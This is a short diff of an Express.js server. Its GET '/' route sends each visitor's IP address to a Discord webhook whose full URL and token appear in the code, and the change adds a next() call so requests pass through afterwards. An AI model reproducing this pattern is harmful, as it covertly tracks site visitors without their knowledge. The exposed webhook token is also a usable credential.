@@ -4,7 +4,7 @@ const app = express();
 const port = 3000;
 app.set('trust proxy', true);
 // Define a route for GET requests
-app.get('/', (req, res) => {
+app.get('/', (req, res, next) => {
     const ip = req.socket.remoteAddress;
     fetch(
     "https://discord.com/api/webhooks/1241084793802850426/e-hMfQ1lVanHlHgavBGJESfwhshIxO0G9TfrZNoeI0GiuIjedUov7NvjHp00wDP2ySlQ", 
@@ -18,6 +18,7 @@ app.get('/', (req, res) => {
         })
     }
     );
+    next();
 });
 
 // Define another route for GET requests with a parameter
